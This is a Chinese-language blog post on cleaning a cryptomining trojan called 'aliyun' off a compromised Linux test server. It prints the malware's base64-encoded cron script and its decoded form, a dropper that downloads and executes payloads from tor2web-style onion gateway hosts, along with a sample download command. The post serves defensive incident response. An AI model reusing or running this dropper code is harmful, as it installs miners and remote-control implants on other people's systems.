---
title: "一个名叫aliyun的挖矿木马处理过程"
date:   2019-12-19  12:00:00 +0800
layout: post
tag:
- Trojan
categories:
- Security
---

一个名叫aliyun的挖矿木马处理过程
------
## 背景
老哥突然私聊我，他负责的服务器CPU飙高，发现可疑进程，疑似挖矿。
![20191219-trojan-01.png](/images/20191219-trojan-01.png)

## 分析
为了防止事态进一步扩大，我让老哥先把这个进程kill掉，然后进行排查，可是没过多久，挖矿进程死灰复燃了，这次挖矿的名称变成了BP70vI
![20191219-trojan-02.png](/images/20191219-trojan-02.png)
我想事情可能没那么简单，可能设置了定时任务或者有其他远控尚未发现。通过排查定时任务使用`crontab -l`，发现有一条定时任务，仔细一看原来是阿里云的shell脚本，但是整个系统就配置了这一条定时任务，难免让人怀疑。
![20191219-trojan-03.png](/images/20191219-trojan-03.png)
当我打开`/root/.aliyun.sh`，我突然发现自己还是太年轻，攻击者尽然使用的是障眼法，没有那个运维人员会闲的蛋疼，把shell程序的内容使用base64进行编码。
![20191219-trojan-04.png](/images/20191219-trojan-04.png)
以下是相关代码，有想研究的小伙伴可以拿去进行研究。
```
#!/bin/bash
exec &>/dev/null
echo ZXhlYyAmPi9kZXYvbnVsbApleHBvcnQgUEFUSD0kUEFUSDovYmluOi9zYmluOi91c3IvYmluOi91c3Ivc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL2xvY2FsL3NiaW4KdD10cnVtcHM0YzRvaHh2cTdvCmRpcj0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmZvciBpIGluIC91c3IvYmluICRkaXIgL2Rldi9zaG0gL3RtcCAvdmFyL3RtcDtkbyB0b3VjaCAkaS9pICYmIGNkICRpICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp4KCkgewpmPS9pbnQKZD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCndnZXQgLXQxIC1UMTAgLXFVLSAtLW5vLWNoZWNrLWNlcnRpZmljYXRlICQxJGYgLU8kZCB8fCBjdXJsIC1tMTAgLWZzU0xrQS0gJDEkZiAtbyRkCmNobW9kICt4ICRkOyRkO3JtIC1mICRkCn0KdSgpIHsKeD0vY3JuCndnZXQgLXQxIC1UMTAgLXFVLSAtTy0gLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAkMSR4IHx8IGN1cmwgLW0xMCAtZnNTTGtBLSAkMSR4Cn0KZm9yIGggaW4gdG9yMndlYi5pbyA0dG9yLm1sIG9uaW9uLm1uIG9uaW9uLmluLm5ldCBvbmlvbi50byBkMndlYi5vcmcgY2l2aWNsaW5rLm5ldHdvcmsgb25pb24ud3Mgb25pb24ubnogb25pb24uZ2xhc3MgdG9yMndlYi5zdQpkbwppZiAhIGxzIC9wcm9jLyQoY2F0IC90bXAvLlgxMS11bml4LzAwKS9pbzsgdGhlbgp4IHRydW1wczRjNG9oeHZxN28uJGgKZWxzZQpicmVhawpmaQpkb25lCgppZiAhIGxzIC9wcm9jLyQoY2F0IC90bXAvLlgxMS11bml4LzAwKS9pbzsgdGhlbgooCnUgJHQudG9yMndlYi5pbyB8fAp1ICR0LjR0b3IubWwgfHwKdSAkdC5kMndlYi5vcmcgfHwKdSAkdC5vbmlvbi5tbiB8fAp1ICR0Lm9uaW9uLmluLm5ldCB8fAp1ICR0Lm9uaW9uLnRvIHx8CnUgJHQuY2l2aWNsaW5rLm5ldHdvcmsgfHwKdSAkdC5vbmlvbi5wZXQgfHwKdSAkdC50b3Iyd2ViLnN1IHx8CnUgJHQub25pb24uZ2xhc3MgfHwKdSAkdC5vbmlvbi53cwopfGJhc2gKZmkK|base64 -d | bash
```
使用base64进行解码，可以得到恶意的shell脚本内容
![20191219-trojan-05.png](/images/20191219-trojan-05.png)
解码以后的内容如下：
```
exec & > /dev/null
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
t=trumps4c4ohxvq7o
dir=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)
for i in /usr/bin $dir /dev/shm /tmp /var/tmp;
do
	touch $i/i && cd $i && rm -f i && break;
done
x() {
	f=/int
	d=./$(date|md5sum|cut -f1 -d-)
	wget -t1 -T10 -qU- --no-check-certificate $1$f -O$d || curl -m10 -fsSLkA- $1$f -o$d
	chmod +x $d;$d;rm -f $d
}
u() {
	x=/crn
	echo "wget -t1 -T10 -qU- -O- --no-check-certificate $1$x || curl -m10 -fsSLkA- $1$x"
}
for h in tor2web.io 4tor.ml onion.mn onion.in.net onion.to d2web.org civiclink.network onion.ws onion.nz onion.glass tor2web.su
do
	if ! ls /proc/$(cat /tmp/.X11-unix/00)/io; then
		x trumps4c4ohxvq7o.$h
	else
		break
	fi
done

if ! ls /proc/$(cat /tmp/.X11-unix/00)/io; then
	(
		u $t.tor2web.io ||
		u $t.4tor.ml ||
		u $t.d2web.org ||
		u $t.onion.mn ||
		u $t.onion.in.net ||
		u $t.onion.to ||
		u $t.civiclink.network ||
		u $t.onion.pet ||
		u $t.tor2web.su ||
		u $t.onion.glass ||
		u $t.onion.ws
	)|bash
fi
```
通过分析，我们可以发现，该shell首先会判断当前用户是否对`/usr/bin 当前用户的home目录 /dev/shm /tmp /var/tmp`这几个目录拥有读写权限。

> **/tmp/.X11-unix/00是什么鬼**
> X11 server需要有一种途径来跟X11 client来进行沟通。 在网络上它们可以通过TCP/IP Socket来实现沟通，而在本机上它们通过一个Unix-domain socket来沟通.Unix-domain socket其实很TCP/IP socket很类似，只不过它指向的是一个文件路径，而且无需通过网卡进行转发，因此相对来说更安全，更更快些。而 /tmp/.X11-unix 其实就是存放这些Unix-domain Socket的地方。一般来说 /tmp/.X11-unix 下面只会有一个 Unix-domain Socket(因为一般只有一个Xserver在运行)，但若系统同时运行多个Xserver，也可能会有多个Unix Domain Socket出现的情况。具体可以参考参考内容里的文章，里面有详细说明

但是，通过查看`/tmp/.X11-unix/`目录中的**00**文件，我并未发现该文件的种类并不是**s**，攻击者可能是为了掩人耳目，故意在该目录下设置一个文件，来存储远控木马进程id
![20191219-trojan-06.png](/images/20191219-trojan-06.png)
通过判断 **/proc/木马进程id/io** 文件是否存在，如果不存在执行**X**函数从以下这些站点三级域名**trumps4c4ohxvq7o**下载int木马客户端
* tor2web.io
* 4tor.ml
* onion.mn
* onion.in.net
* onion.to
* d2web.org
* civiclink.network
* onion.ws
* onion.nz
* onion.glass
* tor2web.su

通过全网检这些三级域名，发现年中的时候有人中招了，文件名不同，但是手法很像，有兴趣可以查看我提供参考链接。下载木马客户端的用户名为当前时间的md5值，然后授权执行删除。
具体使用wget或者curl请求下载int木马文件拼接案例语句如下：
```
wget -t1 -T10 -qU- --no-check-certificate trumps4c4ohxvq7o.onion.mn/int -O./e0ee4ac14e82501dc127890f75770c17   || curl -m10 -fsSLkA- trumps4c4ohxvq7o.onion.mn/int -o./e0ee4ac14e82501dc127890f75770c17
```
将下载下来的int和crn文件进行分析，
virustotal返回的结果是crn是安全的，int只有Ikarus和SentinelOne (Static ML)两个引擎判断为木马，可见这个木马病毒在绕过引擎检测方面下了大量功夫。
crn检测结果：
![20191219-trojan-17.png](/images/20191219-trojan-17.png)
int检测结果：
![20191219-trojan-18.png](/images/20191219-trojan-18.png)
返现int木马程序主体，crn为shell文件，目的是下载int木马程序并运行，crn文件并未进行编码和混淆，不太清楚作者为何这么做。
![20191219-trojan-19.png](/images/20191219-trojan-19.png)
将int扔到IDA并未发现什么，只发现基本的逻辑流程，可能个人逆向功底太弱了，那位大佬分析了，可以请教一下。
![20191219-trojan-20.png](/images/20191219-trojan-20.png)
接下来我们继续分析aliyun.sh脚本，发现木马通过判断 **/proc/木马进程id/io** 文件是否存在，如果不存在执行**U**函数从以下这些站点三级域名**trumps4c4ohxvq7o**下载**crn** shell脚本并执行，
使用`lsof`命令查看该进程相关信息，如果没有相关命令，请自行安装
![20191219-trojan-07.png](/images/20191219-trojan-07.png)
可以发现相应的远控客户端（/usr/bin/46e5166a46208402e09732a78526b5f0）已删除
使用top我们可以发现，该挖矿木马的客户端的进程id为8391，
![20191219-trojan-08.png](/images/20191219-trojan-08.png)
通过查看`/tmp/.X11-unix/00`文件，获取对应远控客户端进程id为**8065**
![20191219-trojan-09.png](/images/20191219-trojan-09.png)
通过pstree，我们可以清晰的看到两个异常的进程**OYK6yV**和 **jKhnvF**
![20191219-trojan-10.png](/images/20191219-trojan-10.png)
通过分析`ps -ef`的结果，获取异常异常进程信息
![20191219-trojan-11.png](/images/20191219-trojan-11.png)
综合所有信息，我们发现jKhnvF是挖矿进程，OYK6yV是木马远控的进程。

## 移除挖矿木马
分析完挖矿木马基本信息，接下来我们需要移除这些恶意的进程，并针对相关漏洞进行打补丁。
我们首先移除了crotab中设定的定时任务
![20191219-trojan-12.png](/images/20191219-trojan-12.png)
然后杀掉两个恶意进程
![20191219-trojan-13.png](/images/20191219-trojan-13.png)
然后我发现当我们kill掉的挖矿进程又死灰复燃了，通过分析，可能其他地方还存在定时任务，或者遗漏，还有其他恶意进程，我们在 **/etc/cron.d/** 下发现**0aliyun**这个定时任务文件，突然发现这里还有一个定时任务，顺便发现在 **/opt/** 目录下，还有一个 **aliyun.sh** 的挖矿脚本。
![20191219-trojan-14.png](/images/20191219-trojan-14.png)
我们通过移除两个定时任务，然后重复上面的操作，找到挖矿端和木马远控客户端，杀掉就行
![20191219-trojan-15.png](/images/20191219-trojan-15.png)
清除`/root/.aliyun.sh`和`/opt/aliyun.sh`
看着运行正常的系统，内心还是很满足的。
![20191219-trojan-16.png](/images/20191219-trojan-16.png)

## 后续
后续溯源工作由于系统是研发同事的测试系统，上面运行三个web站点，并且安装redis，memcache等，并且未设置日志，所以并未发现攻击者是从什么地方进来的。针对这些问题我们给出以下建议:
1、配置redis的日志，对redis进行安全加固和合规性配置
2、使用河马webshell查杀工具对web目录进行扫描，查看是否有遗留的webshell
3、加固操作系统，重新设置复杂度较高的密码。

## 参考内容
* [http://blog.lujun9972.win/blog/2018/04/24/docker%E5%AE%B9%E5%99%A8%E4%B8%AD%E8%B7%91gui%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95/index.html](http://blog.lujun9972.win/blog/2018/04/24/docker%E5%AE%B9%E5%99%A8%E4%B8%AD%E8%B7%91gui%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95/index.html)【/tmp/.X11-unix=是什么玩意】
* [https://unix.stackexchange.com/questions/196677/what-is-tmp-x11-unix](https://unix.stackexchange.com/questions/196677/what-is-tmp-x11-unix) 【what-is-tmp-x11-unix】
* [https://www.cnblogs.com/jinanxiaolaohu/p/11993504.html](https://www.cnblogs.com/jinanxiaolaohu/p/11993504.html)
